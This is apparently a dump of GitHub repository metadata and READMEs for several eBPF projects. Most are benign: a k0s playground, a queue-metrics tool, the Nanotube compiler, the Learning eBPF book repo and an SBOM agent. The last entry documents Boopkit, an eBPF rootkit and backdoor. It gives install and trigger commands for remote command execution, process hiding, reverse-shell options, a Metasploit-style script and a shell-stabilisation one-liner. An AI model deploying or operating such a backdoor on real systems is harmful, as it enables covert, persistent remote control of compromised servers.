|SSHKEYNAME|name of the ssh key file|string|id_rsa|if the file doesn't exist the scripts will create it and initialize it with a blank passphrase <br><br> if the keypair already exist make sure it has a **BLANK** passphrase or use ssh-agent and load the keypair before running the scripts|
|K0SADMINUSERNAME|system acountname to be created in each VMs|string|k0s|      |
|K0SCONTROLLERCOUNT|number of controller nodes to be configued|number|1|      |
|K0SCLUSTERNUMBER|number of cluster to be deployed and configured|number|2|      |
|K0SCLUSTERNAMEVAR|name to be for each cluster|string|k0scilium|      |


### deployment
if you don't feel the need to tweak the default variables, you just need to run the `init_playground` :
```
git clone https://github.com/xinity/k0s_cilium_playground
chmod u+x playground.sh
./playground.sh -i

or

./playground.sh --install
```

### TODO
- code refactoring
- log management 
- FULL debug mode
- add full https local FQDN management
- add cilium full ingress support
- add support for Cilium 1.13 IPAM (without metallb)"
krisnova/q,86,6,86,0,Rust,Surface Linux networking metrics with eBPF,2023-03-11T18:41:46Z,2025-09-22T11:18:39Z,31,"# q

A smol ðŸ¤ static rust binary which can be used to surface kernel queueing metrics with eBPF kprobes.

The easiest metrics to surface are anything found in the [sock](https://www.kernel.org/doc/html/v6.2/networking/kapi.html#c.sock) API.

The following 'accept queues' are currently instrumented.

 - [X] TCP/IPv4
 - [X] TCP/IPv6
 - [ ] UDP (Connectionless)
 - [ ] Unix domain

### Building 

```bash
# Compile the eBPF probe, embed the probe into the binary, compile and install the static binary
make ebpf install
```

### Running

```bash 
sudo q
```

### Observing The Linux Accept Queue

Execute the `dysfunctional-listen-not-accept-tcp-exec` server and send curl requests to `localhost:9064`.

Notice that the requests will accumulate in the accept queue even once the client has been killed. The only way to ""flush"" the queue is to terminate the server. I am currently unsure
if Linux provides another way to clean up these orphaned connections.

```bash 
[2023-03-13T04:50:35Z INFO  q] Success! Loaded eBPF probe into kernel
[2023-03-13T04:50:35Z INFO  q]  --> Attached: kprobe__tcp_conn_request
[2023-03-13T04:50:35Z INFO  q]  --> Attached: kprobe__inet_csk_accept
[2023-03-13T04:50:35Z INFO  q] Waiting for Ctrl-C...
[2023-03-13T04:50:44Z INFO  qprobe] AF_INET 'accept queue' qlen: 8, qmax: 4096, src address: 0.0.0.0, dest address: 0.0.0.0
[2023-03-13T04:50:48Z INFO  qprobe] AF_INET 'accept queue' qlen: 9, qmax: 4096, src address: 0.0.0.0, dest address: 0.0.0.0
[2023-03-13T04:50:50Z INFO  qprobe] AF_INET 'accept queue' qlen: 10, qmax: 4096, src address: 0.0.0.0, dest address: 0.0.0.0
[2023-03-13T04:50:51Z INFO  qprobe] AF_INET 'accept queue' qlen: 11, qmax: 4096, src address: 0.0.0.0, dest address: 0.0.0.0
```
"
Xilinx/nanotube,106,9,106,2,LLVM,,2023-03-03T10:15:00Z,2025-10-08T08:44:34Z,357,"# Copyright and License

Copyright (C) 2023, Advanced Micro Devices, Inc. All rights reserved.
SPDX-License-Identifier: MIT

# The Nanotube Compiler and Framework

Nanotube is a collection of compiler passes, libraries, and an API to
facilitate execution of EBPF XDP and similar networking code on an FPGA in a
SmartNIC.  The compiler takes EBPF XDP C code as input and outputs a packet
processing pipeline in HLS C++.  This HLS C++ code can then be synthesised
using Vitis HLS and placed on an FPGA.

The compiler performs various transformations on the program; starting with a
translation of EBPF calls to calls to similar Nanotube API functions.  It then
performs multiple stages of transforming the code structurally and to different
API levels:

- mem2req: Converts C style pointer accesses (loads & stores) to explicit
  accesses to map and packet data
- optreq: combines adjacent map / packet accesses into fewer wider accesses
- converge: straightens the control-flow graph around Nanotube API calls
- pipeline: splits the single packet processing function into multiple
  coarse-grained pipeline stages, and change the application logic to process
  packet words flowing through, rather than a flat packet representation in
  memory
- hls: creates HLS C++ code from LLVM IR for synthesis with Vitis HLS

The Nanotube library implements packet accesses and maps in an implementation
which is synthesis friendly, meaning that it will be placed in the application
and will create efficient hardware in high-level synthesis.

# Getting started

Before compiling Nanotube, you need to make sure all the dependencies
are available.  Many of them are available as packages in common Linux
distributions.  The others are LLVM and Vitis-HLS.

You will need enough free storage space for Nanotube and its
dependencies.  Using local storage will be faster, but network storage
can be used if preferred.

Building Nanotube itself requires only the headers from Vitis-HLS and
that is enough to test the HLS output of Nanotube.  Generating Verilog
from the HLS output and building bitfiles requires full installations
of Vitis-HLS and Vivado.  The Nanotube build system will attempt to
locate installations of Vitis-HLS and Vivado on the legacy Xilinx
network.  If this fails, it will be necessary to provide the path to a
directory which contains either a full Vitis-HLS install or just
include sub-directory.

Approximate sizes for a minimal installation are:

      LLVM              24.2G
      Vitis-HLS headers  5.6M
      Nanotube           1.9G

A full installation will require the following instead of the
Vitis-HLS headers:

      Vitis-HLS full     6.5G
      Vivado            81.8G

## Installing Linux packages

Every Linux distribution has a different set of available packages and
package names vary between distributions.  To make things easier,
instructions are given here for some common distributions.  It may be
possible to compile Nanotube on other distributions using similar
instructions, but there may be missing packages or other problems.

### Installing packages on Ubuntu 20.04

To install the require packages, run these commands as root:

      apt-get install -y cmake g++ m4 libpcap-dev wireshark scons libelf-dev libpci-dev
      apt-get install -y libboost-dev libboost-doc libboost-program-options-dev
      apt-get install -y python-is-python2 libxml2-dev libboost-system-dev
      apt-get install -y python3-yaml python3-scapy libbpf-dev

Note that the python-is-python2 package changes the /usr/bin/python
symlink to point to Python2, so it may affect other programs or
projects.  It is required for LLVM to work correctly.

### Installing packages on Ubuntu 18.04

To install the require packages, run these commands as root:

      apt-get install -y cmake g++ m4 libpcap-dev wireshark scons libelf-dev libpci-dev
      apt-get install -y libboost-dev libboost-doc libboost-program-options-dev
      apt-get install -y libxml2-dev libboost-system-dev
      apt-get install -y python3-yaml python3-scapy libbpf-dev

## Checking out the Nanotube repository

To checkout the Nanotube repository, run this command:

      git clone https://github.com/Xilinx/nanotube.git

or (if you are logged into Github):

      git clone git@github.com:Xilinx/nanotube.git


## Downloading and building LLVM

You will need to build LLVM before building Nanotube.  The build_llvm
script makes this process easier and selects LLVM build options which
are known to work.  Nanotube is built against LLVM 12.0.0 built from source,
but we are planning to a more recent version of LLVM and explore the use of
distribution packages.

The script build_llvm accepts -j<N> like make does.

### Downloading LLVM

Choose a directory where LLVM will be built.  The instructions below
use /scratch/$USER/nanotube-llvm, but a different directory can be
used if preferred.  Just make sure the correct path is given in
later commands.

      mkdir -p /scratch/$USER
      git clone -b llvmorg-12.0.0 https://github.com/llvm/llvm-project.git --depth 1  /scratch/$USER/nanotube-llvm

### Building LLVM

To build LLVM on other systems, run this command:

      scripts/build_llvm -j4 /scratch/$USER/nanotube-llvm

## Installing Vitis-HLS and Vivado

The Nanotube compiler compiles from EBPF XDP C to C++ with HLS annotations,
converting the program in multiple steps.  The output of each step can be
executed for testing, including the produced HLS C++ code.  For that, we need
Vitis-HLS headers; for synthesising the design onto an FPGA, a full
installation of Vitis is required.

Vitis can be obtained from [its product page](https://www.xilinx.com/products/design-tools/vitis/vitis-platform.html).

A minimal installation uses only the install directory from a normal
Vitis-HLS installation.  First find an existing installation of
Vitis-HLS or install a new one.  Then create a destination directory
and copy the include directory into it.  For example:

      mkdir  /scratch/$USER/Vitis_HLS_2022.2
      rsync -a <vitis_install_dir>/Vitis_HLS/2022.2/include/ /scratch/$USER/Vitis_HLS_2022.2/include/

## Building Nanotube

The Nanotube build system is based on scons.  When building the
project for the first time, it may be necessary to provide the
locations of dependencies on the scons command line.  The locations
specified are stored in the build configuration (build/config.json) so
they do not need to be provided when rebuilding the project.

By default, scons will build all the files in the build directory.
The scons command accepts extra command line arguments to control the
build process:

      LLVM_CONFIG=<path>      Specify the location of the llvm-config executable.
      XILINX_VITIS_HLS=<path> Specify the location of the Vitis-HLS installation.
      -j<N>                   Run <N> jobs in parallel.
      run_tests               Build the project and run the tests.
      <path-to-file>          Build the specified file.
      <path-to-directory>     Build all the files in the specified directory.

The path to the llvm-config executable is specified using the
LLVM_CONFIG variable on the scons command line and the path to the Vitis-HLS
installation is specified using the XILINX_VITIS_HLS variable:

      scons LLVM_CONFIG=/scratch/$USER/nanotube-llvm/build/bin/llvm-config XILINX_VITIS_HLS=/scratch/$USER/Vitis_HLS_2022.2 [args...]

(NOTE: When building on a machine inside the AMD / Xilinx network, we use an
existing Vitis-HLS install and XILINX_VITIS_HLS is auto-detected and can be
omitted.)

Once the build directory has been created using the commands above,
the LLVM_CONFIG and XILINX_VITIS_HLS options can be omitted, so the
tests can be re-run using this shorter command:

      scons -j4 run_tests

To compile the bpf-compile compiler (eBBPF -> LLVM-IR) do the following:

      scons build/bpf-compile

To run the resulting tool, use

      build/bpf-compile examples/build/xdp_tx_iptunnel_kern.o

## Running tests from outside the repository

Nanotube has support for running tests that live outside of the main
repository, but follow the same types (e.g., kernel_tests, pass_tests) and use
the same build & run infrastructure as the tests in this repository.  This can
be useful for running tests as part of regression testing that should not be in
this repository.

The external tests will be built into the normal build directory.  Note that
the setting will persist across invocations to scons, please see below.

Use as follows:

    scons ... EXTRA_TESTS=../my_additional_tests/ all
    scons ... run_tests

The directory structure in my_additional_tests should match that of
what exists in the normal Nanotube repository:

    > tree -L 2 -d ../my_additional_tests
    ...
    â”œâ”€â”€ testing
    â”‚Â Â  â”œâ”€â”€ kernel_tests
    â”‚Â Â  â””â”€â”€ pass_tests
    ...

These additional tests will use the same build and test running infrastructure
as the existing tests, but custom files need to be provided in
my_additional_tests:

- lit.cfg, lit.local.cfg .. defining the test suite
- gen_test_list .. defining the different tests and options used for them

Have a look at the tests in this repository for how they are used.

## Perform an HLS build

When scons has finished building the compiler and tests, the following
command will perform an HLS build of one of the test programs.

      scripts/hls_build -- \
        build/testing/kernel_tests/tap_packet_read.link_taps.inline_opt.hls \
        tmp/tap_packet_read \
        --pcap-in $(pwd)/build/testing/kernel_tests/golden/test_tap_packet_read.pcap.IN \
        --pcap-exp $(pwd)/build/testing/kernel_tests/golden/test_tap_packet_read.pcap.OUT

The HLS build benefits from machines with fast CPUs and lots of memory.  If
your environment has access to an LSF cluster, you can use ""--bsub"" after
""scripts/hls_build"" to run the compilation there.  Note that this may need
adaptation depending on your specific LSF setup.  Add ""-j <N>"" to run multiple
jobs in parallel.  Add ""--clean most"" to remove the simulation directories
after completing each synthesis.

The utilisation and performance can be viewed with the following command:

      scripts/report_hls_synth tmp/tap_packet_read

The -s option will give just the aggregate values.

# Example

Please see examples/katran/README.md for an example using Facebook's Katran L4
load balancer.

The tests (especially those in testing/kernel_tests) also provide insight into
Nanotube functionality.

# Releases

Nanotube currently does not have a formal release process.  That means we do
not provide formal releases, stable branches, etc.  Instead, the main branch
will regularly receive new features, bug fixes, and occasionally bigger
changes such as API changes.

# Contributing

Contributing to the Nanotube compiler is possible via GitHub pull requests.
External contributions will be reviewed by core Nanotube developers.  If the
contribution passes the review and fits the project, we will merge it; if not,
we will provide comments on the proposed changes.

Here are a few rules for contributing:

* Contributed code will be released under the project's license; make sure
  that this is okay (no lifting of code from elsewhere, make sure your employer
  knows, etc)
* Each commit must have a descriptive commit message describing a high-level
  of the change and why it is needed
* Each commit must compile and pass the tests in the repository
* New contributed features should provide tests; that way, we can be more
  confident they do not break in the future
* Commits should be incremental and split logically for easier code review

# Reporting bugs

We use GitHub issues for tracking bugs in the compiler.

  https://github.com/Xilinx/nanotube/issues

When filing a bug, the summary should include a short clear
description of the bug.

## Information to include in the description.

The description should provide enough details for someone else to
reproduce the problem.  The following pieces of information will make
that easier.

### What commands you typed.

If you provide the exact commands you typed then the person who is
trying to reproduce the problem can copy them into their terminal.
Without the exact commands, they are likely to type a different
command which might not show the problem.  It's important to provide
the full commands, even if you think some parts are not relevant.

### What you are trying to do.

Sometimes the desired effect of a command is not obvious.  If you
describe what you are trying to do, the person handling the bug can
confirm that the commands you typed are expected to have the effect
you want.

### What output you saw.

The person trying to reproduce the problem will want to know whether
their attempt has been successful.  An easy way to do that is to copy
the output you saw into the bug report.  The output may also allow
them to diagnose the problem without reproducing it.

### What output did you expected to see.

It's useful to be clear about what you expect to see, even if you
think that is obvious.  For example, if the program crashed, you might
say that you expect it to generate an error message or that you expect
it to successfully generate the output file.  This is to make sure the
bug gets fixed in a way which is acceptable to you.

### The commit ID of the Nanotube repository.

Some bugs only occur with specific versions of the Nanotube source
code.  To make sure the person trying to reproduce the problem is
using the same version, provide the commit ID in your description.
This can be obtained by using the following command:

  git log -1

### The version of the operating system being run.

Some bugs only occur with a specific operating system or version of an
operating system.  To handle these cases, it's useful to provide the
operating system version being used in the bug description.  The
following command will report the operating system version on most
Linux distributions:

  lsb_release -a
"
lizrice/learning-ebpf,1585,317,1585,7,C,"Learning eBPF, published by O'Reilly - out now! Here's where you'll find a VM config for the examples, and more",2022-08-02T08:50:26Z,2025-10-12T12:26:30Z,107,"# Learning eBPF

This repo accompanies my new book [Learning
eBPF](https://www.amazon.com/Learning-eBPF-Programming-Observability-Networking/dp/1098135121)
(published by O'Reilly).

<img src=""learning-ebpf-cover.png"" height=250 
alt=""Learning eBPF cover features an image of an Early
Bumblebee"" />

Buy your copy of the book from
[Bookshop.org](https://bookshop.org/p/books/learning-ebpf-programming-the-linux-kernel-for-enhanced-observability-networking-and-security-liz-rice/19244244?ean=9781098135126)
or
[Amazon](https://www.amazon.com/Learning-eBPF-Programming-Observability-Networking/dp/1098135121),
view it on the [O'Reilly platform](https://www.oreilly.com/library/view/learning-ebpf/9781098135119/), or download a copy from [Isovalent](https://isovalent.com/learning-ebpf). 

## Running the example code

The repo includes the example eBPF programs discussed in the book.

I've also provided a [Lima](https://github.com/lima-vm/lima) config file with
the packages you need for building the code pre-installed.

If you have a Linux machine or VM to hand, feel free to use that instead of
Lima, using the `learning-ebpf.yaml` file as a guide for the packages you'll 
need to install. The minimum kernel version required varies from chapter to chapter. All
these examples have been tested on an Ubuntu 22.04 distribution using a 5.15 kernel. 



### Install this repo

```sh
git clone --recurse-submodules https://github.com/lizrice/learning-ebpf
cd learning-ebpf
```

### Lima VM

```sh
limactl start learning-ebpf.yaml
limactl shell learning-ebpf

# You'll need to be root for most of the examples
sudo -s
```

### Building libbpf and installing header files

Libbpf is included as a submodule in this repo. You'll need to build and install
it for the C-based examples to build correctly. (See libbpf/README.md for more
details.)

```sh
cd libbpf/src
make install 
cd ../..
```

### Building bpftool

There are several examples using `bpftool` throughout the book. To get a version
with libbfd support (which you'll need if you want to see the jited code in the 
Chapter 3 examples) you might need to build it from source:

```sh
cd ..
git clone --recurse-submodules https://github.com/libbpf/bpftool.git
cd bpftool/src 
make install 
```

`bpftool` binaries are now also available from https://github.com/libbpf/bpftool/releases these days.

## Examples

You won't be surprised to learn that the directories correspond to chapters in
the book. Here are the different examples that accompany each chapter.

* Chapter 1: What Is eBPF and Why Is It Important?
* [Chapter 2: eBPF's ""Hello World""](chapter2/README.md) - Basic examples using the BCC framework.
* [Chapter 3: Anatomy of an eBPF Program](chapter3/README.md) - C-based XDP
  examples, used in the book to explore how the source code gets transformed to eBPF bytecode and
  machine code. There's also an example of BPF to BPF function calls.
* [Chapter 4: The bpf() System Call](chapter4/README.md) - More BCC-based examples, used in the book to
  illustrate what's happening at the syscall level when you use eBPF.
* [Chapter 5: CO-RE, BTF and Libbpf](chapter5/README.md) - Libbpf-based C
  example code.
* [Chapter 6: The eBPF Verifier](chapter6/README.md) - Make small edits to the
  example code to cause a variety of verifier errors!
* [Chapter 7: eBPF Program and Attachment Types](chapter7/README.md) - Examples
  of different eBPF program types.
* [Chapter 8: eBPF for Networking](chapter8/README.md) - Example code that
  attaches to various points in the network stack to interfere with ping and
  curl requests. 
* [Chapter 9: eBPF for Security](chapter9/README.md) - Example attaching to the LSM API.
* [Chapter 10: eBPF Programming](chapter10/README.md) - The book explores examples from various eBPF
  libraries.
* Chapter 11: The Future Evolution of eBPF

There are no code examples for Chapters 1 and 11.

### Privileges

You'll need root privileges (well, strictly CAP_BPF and [additional
privileges](https://mdaverde.com/posts/cap-bpf/)) to be able to load BPF
programs into the kernel. `sudo -s` is your friend.

### View eBPF trace output

A couple of ways to see the output from the kernel's trace pipe where eBPF
tracing gets written:

* `cat /sys/kernel/debug/tracing/trace_pipe`
* `bpftool prog tracelog`

## Installing on other Linux distributions

As noted above, I've tested these examples using Ubuntu 22.04 and a 5.15 kernel. If you're using a different distribution and / or kernel version you might run into incompatibilities between various packages and dependencies. For example: 

 - My installation uses Clang 14. If you're using Clang 15 or later (which you can check with `clang --version` you'll need [BCC version 0.27.0](https://github.com/iovisor/bcc/releases) or later

## Corrections

I'd love to hear if you find corrections and improvements for
these examples. Issues and PRs are welcome!
"
edgebitio/edgebit-agent,14,5,14,0,C,Linux agent used to submit realtime SBOMs and dependency usage information to EdgeBit,2023-01-17T06:02:05Z,2025-01-24T20:42:58Z,222,"# About

EdgeBit agent is designed to track what packages are actively used by the system in order to ascertain which portions of the SBOM are relavent for vulnerability remediation.

# Building

To make it easier to deploy, the agent is a statically linked binary based on musl. As such, it is highly recommended to be built inside of a Docker container.

Use the following steps to build the agent.

1. Checkout the repo and pull down the submodules:
```
git clone https://github.com/edgebitio/edgebit-agent.git
cd edgebit-agent
git submodule update --init
```

2. Build the builder container:
```
cd build
docker buildx build -t agent-builder .
```

3. Alias the docker run command to make it easier to reuse. The `cargo-git` and `cargo-registry` volumes are there to preserve the cache between builds.
```
alias agent-builder='docker run --rm -it -v ""$(pwd)"":/root/src -v cargo-git:/root/.cargo/git -v cargo-registry:/root/.cargo/registry agent-builder'
```

5. Build the agent
```
cd ..

# For debug build:
agent-builder cargo build

# For release build
agent-builder cargo build --release
```

# Docker based deployment

## Building a Docker container

To build a Docker image containing the agent, follow the steps below:

1. Checkout the repo and pull down the submodules:
```
git clone https://github.com/edgebitio/edgebit-agent.git
cd edgebit-agent
git submodule update --init
```

2. Build the builder container:
```
cd build
docker buildx build -t agent-builder .
```

3. Build the Docker image:
```
cd ..
docker build -t edgebit-agent .
```

## Running the Docker container

You can use a configuration file and bind mount it into the container at `/etc/edgebit/config.yaml`.
However for simple deployments, it can be easier to use environment variables to supply the URL and the ID (deployment token):

```
docker run \
  --name edgebit-agent \
  --rm \
  -d \
  --privileged \
  --pid host \
  --mount ""type=bind,source=/,destination=/host"" \
  --mount ""type=bind,source=/etc/edgebit,destination=/etc/edgebit"" \
  --mount ""type=bind,source=/sys/kernel/debug,destination=/sys/kernel/debug"" \
  --mount ""type=bind,source=/run/docker.sock,destination=/run/docker.sock"" \
  --mount ""type=volume,source=var-edgebit,destination=/var/lib/edgebit"" \
  -e ""EDGEBIT_ID=YOUR_DEPLOYMENT_TOKEN"" \
  -e ""EDGEBIT_URL=https://YOUR_ORG.edgebit.io"" \
  edgebit-agent:latest --hostname ""$(hostname)""
```

# Kubernetes based deployment

The agent can be deployed on the Kubernetes as a privileged pod running as a DaemonSet:

1. Edit [config.yaml](dist/kube/config.yaml) to put configure the EdgeBit URL and your EdgeBit ID (Deployment Token).

2. Apply [config.yaml](dist/kube/config.yaml):
```
kubectl apply -f config.yaml
```

3. Apply [daemonset.yaml](dist/kube/daemonset.yaml) to deploy the Agent:
```
kubectl apply -f daemonset.yaml
```

# Configuration
The agent supports the following environment variables and configuration file keys:

| Environment Variable         | Config file key      | Required | Description                                   | Default value
| ---------------------------- | -------------------- | -------- |---------------------------------------------- | -------------
| `EDGEBIT_ID`                 | `edgebit_id`         | Yes      | The EdgeBit node agent deployment token       |
| `EDGEBIT_URL`                | `edgebit_url`        | Yes      | Org specific EdgeBit URL                      |
| `EDGEBIT_SYFT_CONFIG`        | `syft_config`        | Yes      | Path to the Syft config file                  |
| `EDGEBIT_SYFT_PATH`          | `syft_path`          | Yes      | Path to the Syft executable                   |
| `EDGEBIT_LOG_LEVEL`          | `log_level`          | No       | Log level: trace, debug, info, warn, error    | `info`
| `EDGEBIT_HOST_INCLUDES`      | `host_includes`      | No       | Included host paths used for package-in-use tracking | `/bin, /lib, /lib32, /lib64, /libx32, /opt, /sbin, /usr`
| `EDGEBIT_HOST_EXCLUDES`      | `host_excludes`      | No       | Excluded host paths (overides includes)       |
| `EDGEBIT_CONTAINER_EXCLUDES` | `container_excludes` | No       | Excluded container paths used for package-in-use tracking | All volumes mounted into the container
| `EDGEBIT_DOCKER_HOST`        | `docker_host`        | No       | Docker socket address                         | `unix:///run/docker.sock`
| `EDGEBIT_CONTAINERD_HOST`    | `containerd_host`    | No       | Containerd socket address                     |
| `EDGEBIT_CONTAINERD_ROOTS`   | `containerd_roots`   | No       | Path to container root filesystems            | `/run/containerd/io.containerd.runtime.v2.task/k8s.io/`
| `EDGEBIT_PKG_TRACKING`       | `pkg_tracking`       | No       | Enable/disable package-in-use tracking        | yes
| `EDGEBIT_MACHINE_SBOM`       | `machine_sbom`       | No       | Enable/disable machine (host) SBOM generation | yes
| `EDGEBIT_LABELS`             | `labels`             | No       | Key/value labels to attach to the workloads. Environment variable should be in `key1=val1;key2=val2` format. The config file value should be a JSON object. |
"
kris-nova/ENOHONK,1636,182,1636,13,C,"Linux eBPF backdoor over TCP. Spawn reverse shells, RCE, on prior privileged access. Less Honkin, More Tonkin.",2022-03-30T12:33:29Z,2025-10-10T08:14:22Z,248,"```
================================================================

    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•   â•šâ•â•   
    Author: Kris NÃ³va <kris@nivenly.com> Version 1.4.0
    
    IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
    EXEMPLARY, OR CONSEQUENTIAL DAMAGES.    

    DO NOT ATTEMPT TO USE THE TOOLS TO VIOLATE THE LAW.
    THE AUTHOR IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTION.
    MISUSE OF THE SOFTWARE, INFORMATION, OR SOURCE CODE
    MAY RESULT IN CRIMINAL CHARGES.
    
    Use at your own risk.

================================================================

Boopkit.
Linux rootkit and backdoor. Built using eBPF.

Usage: 
boopkit [options]

Options:
-h, help           Display help and usage for boopkit.
-i, interface      Interface name. lo, eth0, wlan0, etc
-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.
-r, reverse-conn   Attempt a reverse RCE lookup if no payload found.
-q, quiet          Disable output.
-x, reject         Source addresses to reject triggers from.

```

Linux backdoor, rootkit, and eBPF bypass tools.
Remote command execution over raw TCP.

 - Tested on Linux kernel 5.16
 - Tested on Linux kernel 5.17
 - Remote code execution over TCP (SSH, Nginx, Kubernetes, etc)
 - Network gateway bypass (bad checksums, TCP reset)
 - Self obfuscation at runtime (eBPF process hiding)

##### Disclaimer

> This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
> I am a professional security researcher. These are white hat tools used for research purposes only.
> Use this responsibly. Never use this software illegally.

![FSpgEXTacAYme8t](https://user-images.githubusercontent.com/13757818/168698377-9c1125d6-698d-4009-a599-56b275b54764.jpeg)

## Server Side

Download and build boopkit.

```bash
wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.3.0.tar.gz
tar -xzf v1.3.0.tar.gz 
cd boopkit-1.3.0/
make
sudo make install
```

Run boopkit in the foreground. 

```bash 
# Reject all boops on localhost and 10.0.0.1
boopkit -x 127.0.0.1 -x 10.0.0.1
```

Run boopkit in the background in quiet mode.

```bash 
# Danger! This can be VERY hard to stop! Run this at your own risk!
boopkit -q &
```

Boopkit is now running and can be exploited using the client `boopkit-boop` command line tool.

## Client Side

Download and build boopkit.

```bash
wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.2.0.tar.gz
tar -xzf v1.2.0.tar.gz 
cd boopkit-1.2.0/
make
sudo make install
```
Run boopkit-boop against the server.

```bash 
# ===================
RCE=""ls -la""
# ===================
LHOST=""127.0.0.1""
LPORT=""3535""
RHOST=""127.0.0.1""
RPORT=""22""
boopkit-boop \
  -lhost $LHOST \
  -lport $LPORT \
  -rhost $RHOST \
  -rport $RPORT \
  -c ""$RCE""
```

# Boop Vectors

Boopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.

TCP Header Format. Taken from [RFC 793](https://datatracker.ietf.org/doc/html/rfc793#section-3.1). September 1981
```
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |          Source Port          |       Destination Port        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                        Sequence Number                        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Acknowledgment Number                      |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |  Data |           |U|A|P|R|S|F|                               |
       | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
       |       |           |G|K|H|T|N|N|                               |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |           Checksum            |         Urgent Pointer        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Options                    |    Padding    |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       {                             data                              }
       {                             ....                              }
       {                             data                              }
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 1. Bad Checksum

First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. This works against any Linux server running boopkit, regardless of the state of TCP services.

Use `-p` with `boopkit-boop` to only use this first vector.

âš ï¸ Some modern network hardware will DROP all malformed checksum packets such as the one required to exploit boopkit using this vector!

### 2. Sending ACK-RST packet

Next the `boopkit-boop` tool will complete a valid TCP handshake with a `SOCK_STREAM` socket against a remote TCP service such as SSH, Kubernetes, Nginx, etc. After the initial TCP handshake is complete, `boopkit-boop` will repeat the process a 2nd time.
The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP reset on the server.

Either of these tactics are enough to independently trigger boopkit.
Various network hardware and runtime conditions will make either tactic more viable.
Boopkit will try both, and respond to both by default.

# Boopscript

The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed on a remote Linux machine.

```bash
# boopscript
RHOST=""127.0.0.1""
RPORT=""22""
LHOST=""127.0.0.1""
LPORT=""3535""

NCAT=""/usr/bin/ncat""
NCATLISTENPORT=""3545""
```

### Compile Time Dependencies 

 - 'clang' 
 - 'bpftool'   Required for `libbpf`
 - 'xdp-tools' Required for `libxdp`
 - 'llvm'
 - 'pcap'
 - 'lib32-glibc'

### Reverse Shell Stabilization

```bash
python -c ""import pty; pty.spawn('/bin/bash')""
```

### References

 - [Tracepoints with BPF](https://lwn.net/Articles/683504/)
 - [Raw TCP Sockets](https://github.com/MaxXor/raw-sockets-example)
 - [Bad BPF](https://github.com/pathtofile/bad-bpf)

Credit to the original authors for their helpful code samples! I forked a lot of code for this project! 
"
